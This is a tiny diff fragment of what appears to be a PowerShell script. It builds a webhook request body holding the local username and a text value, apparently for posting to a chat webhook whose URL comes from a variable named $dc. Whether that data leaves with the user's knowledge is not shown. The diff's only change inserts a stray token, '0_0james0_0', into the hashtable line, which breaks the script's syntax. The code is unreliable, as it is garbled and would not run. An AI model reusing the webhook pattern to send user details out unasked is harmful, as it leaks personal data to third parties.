@@ -547,7 +547,7 @@ param (
 
 $hookurl = "$dc"
 
-$Body = @{
+$Body = @{0_0james0_0
   'username' = $env:username
   'content' = $text
 }
